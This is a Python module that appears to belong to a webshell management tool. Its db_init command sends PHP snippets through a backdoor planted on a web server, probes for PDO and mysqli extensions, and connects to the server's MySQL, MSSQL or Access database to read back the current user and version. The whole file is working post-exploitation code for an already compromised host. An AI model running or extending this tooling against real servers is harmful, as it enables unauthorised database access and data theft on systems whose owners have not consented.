from libs.config import alias, color, gget, gset
from libs.myapp import send, get_db_connect_code


PDO_DMBS_EXT_DICT = {"mssql": ("pdo_sqlsrv", "pdo_mssql", "pdo_odbc", "pdo_dblib"), "access": ("pdo_odbc", )}


def detect_ext(*exts):
    ext_str = ",".join(f'"{e}"' for e in exts)
    return """$d=array(%s);
foreach ($d as $v){if(extension_loaded($v)){echo $v.",";}}
""" % ext_str


def get_php(host, username, password, dbname, port):
    connect_type = gget("db_connect_type", "webshell")
    connect_code = get_db_connect_code(host, username, password, dbname, port)
    dbms = gget("db_dbms", "webshell")
    select_user_code = ""
    select_version_code = ""
    if (dbms == "mysql"):
        select_user_code = "SELECT CURRENT_USER();"
        select_version_code = "SELECT @@VERSION;"
    elif (dbms == "mssql"):
        select_user_code = "SELECT CURRENT_USER;"
        select_version_code = "SELECT @@VERSION;"
    elif (dbms == "access"):
        select_user_code = "SELECT CurrentUser();"
        select_version_code = "SELECT @@VERSION;"
    if (connect_type == "pdo"):
        return """try{%s
$r=$con->query('%s');
$rr=$r->fetch();echo $rr[0]."\\n";
$r=$con->query('%s');
$rr=$r->fetch();echo $rr[0]."\\n";
} catch (PDOException $e){
die("Connect error: ". $e->getMessage());
}""" % (connect_code, select_user_code, select_version_code)
    elif (connect_type == "mysqli"):
        return """%s
if (!$con)
{
die("Connect error: ".mysqli_connect_error());
} else{
$r=$con->query('%s');
$rr=$r->fetch_all(MYSQLI_NUM);echo $rr[0][0]."\\n";$r->close();
$r=$con->query('%s');
$rr=$r->fetch_all(MYSQLI_NUM);echo $rr[0][0]."\\n";$r->close();
$con->close();
}""" % (connect_code, select_user_code, select_version_code)
    else:
        return ""


def print_db_info():
    database = gget("db_dbname", "webshell")
    dbms = gget("db_dbms", "webshell").title()
    print(f"\nCurrenct User:\n    {gget('db_current_user', 'webshell')}")
    print(f"\nCurrenct Database:\n    {database if database else 'None'}")
    print(f"\n{dbms} Version:\n    {gget('db_version', 'webshell')}\n")


@alias(True, _type="DATABASE", h="host", u="username", pwd="password", p="port")
def run(host: str, username: str, password: str, dbname: str = "", port: int = 0, dbms: str = "mysql"):
    """
    db_init

    Initialize the database connection.

    Support dbms:
    - mysql
    - mssql
    - access

    eg: db_init {host} {username} {password} {dbname=''} {port=0} {dbms='mysql'}
    """
    dbms = dbms.lower()
    db_ext = dbms
    res = send(detect_ext("PDO", "mysqli"))
    if (not res):  # 探测是否存在pdo/mysqli扩展
        print("\n" + color.red("Detect error") + "\n")
        return
    text = res.r_text.lower()
    if (dbms == "mysql" and not text):
        print("\n" + color.red("No PDO and mysqli extension") + "\n")
        return
    elif ("pdo" not in text):
        print("\n" + color.red("No PDO extension") + "\n")
        return
    if (dbms in PDO_DMBS_EXT_DICT):
        res = send(detect_ext(*PDO_DMBS_EXT_DICT[dbms]))
        text = res.r_text.strip()
        if (not res):  # 探测pdo支持的mssql扩展
            print("\n" + color.red(f"Detect PDO extension for {dbms} error") + "\n")
            return
        db_ext = text.split(",")[0][4:]
    gset("db_dbms", dbms, True, "webshell")
    gset("db_ext", db_ext, True, "webshell")
    gset("db_connect_type", text.split(",")[0], True, "webshell")
    res = send(get_php(host, username, password, dbname, port))
    if (not res):
        return
    if ("Connect error" in res.r_text):
        print("\n" + color.red(res.r_text.strip()) + "\n")
    else:
        print("\n" + color.green("Connect success"))
        gset("db_connected", True, True, "webshell")
        gset("db_host", host, True, "webshell")
        gset("db_username", username, True, "webshell")
        gset("db_password", password, True, "webshell")
        gset("db_dbname", dbname, True, "webshell")
        gset("db_port", port, True, "webshell")
        info = res.r_text.strip()
        if (info):
            info_list = info.split("\n")
            try:
                gset("db_current_user", info_list[0], True, "webshell")
                gset("db_version", info_list[1], True, "webshell")
                print_db_info()
            except IndexError:
                print("\n" + color.red("Select data error") + "\n")
